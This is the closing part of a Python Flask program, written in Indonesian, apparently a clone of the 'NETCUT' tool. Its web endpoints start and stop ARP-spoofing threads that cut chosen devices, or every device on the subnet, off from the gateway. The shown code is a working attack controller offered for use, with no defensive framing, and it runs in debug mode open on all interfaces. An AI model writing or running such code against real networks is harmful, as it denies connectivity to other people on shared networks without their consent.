        traceback.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route('/attack', methods=['POST'])
def attack():
    """Mulai ARP attack ke target IP."""
    data = request.json
    target_ip = data.get('ip')
    
    if not target_ip:
        return jsonify({"error": "IP tidak diberikan"}), 400
    
    if target_ip == NETWORK['local_ip']:
        return jsonify({"error": "Tidak bisa attack diri sendiri!"}), 400
    
    if target_ip == GATEWAY_IP:
        return jsonify({"error": "Jangan attack gateway! Nanti semua device mati"}), 400
    
    if active_attacks.get(target_ip):
        return jsonify({"status": f"Sudah attacking {target_ip}"}), 200
    
    active_attacks[target_ip] = True
    t = threading.Thread(target=spoof_loop, args=(target_ip, GATEWAY_IP), daemon=True)
    t.start()
    attack_threads[target_ip] = t
    
    return jsonify({"status": f"Memutus koneksi {target_ip}", "success": True})

@app.route('/stop', methods=['POST'])
def stop():
    """Stop ARP attack dan restore koneksi."""
    data = request.json
    target_ip = data.get('ip')
    
    if not target_ip:
        return jsonify({"error": "IP tidak diberikan"}), 400
    
    active_attacks[target_ip] = False
    
    return jsonify({"status": f"Mengembalikan koneksi {target_ip}", "success": True})

@app.route('/attack_all', methods=['POST'])
def attack_all():
    """Attack semua device kecuali self dan gateway."""
    data = request.json
    targets = data.get('targets', [])
    
    results = []
    for target_ip in targets:
        if target_ip == NETWORK['local_ip'] or target_ip == GATEWAY_IP:
            continue
        if not active_attacks.get(target_ip):
            active_attacks[target_ip] = True
            t = threading.Thread(target=spoof_loop, args=(target_ip, GATEWAY_IP), daemon=True)
            t.start()
            attack_threads[target_ip] = t
            results.append(target_ip)
    
    return jsonify({"status": f"Memutus {len(results)} device", "targets": results, "success": True})

@app.route('/stop_all', methods=['POST'])
def stop_all():
    """Stop semua attack."""
    stopped = []
    for ip in list(active_attacks.keys()):
        if active_attacks.get(ip):
            active_attacks[ip] = False
            stopped.append(ip)
    
    return jsonify({"status": f"Mengembalikan koneksi {len(stopped)} device", "stopped": stopped, "success": True})

@app.route('/status', methods=['GET'])
def status():
    """Ambil status attack saat ini."""
    attacking = [ip for ip, active in active_attacks.items() if active]
    return jsonify({
        "attacking": attacking,
        "count": len(attacking)
    })


if __name__ == '__main__':
    print("\n" + "="*50)
    print("  NETCUT - Network Control Tool")
    print("="*50)
    print(f"  Gateway  : {GATEWAY_IP}")
    print(f"  Local IP : {NETWORK['local_ip']}")
    print(f"  Subnet   : {SUBNET}.0/24")
    print(f"  Buka browser: http://localhost:5000")
    print("="*50 + "\n")
    print("  [!] JALANKAN SEBAGAI ADMINISTRATOR!")
    print("  [!] Pastikan Npcap/WinPcap terinstall\n")
    app.run(debug=True, port=5000, host='0.0.0.0')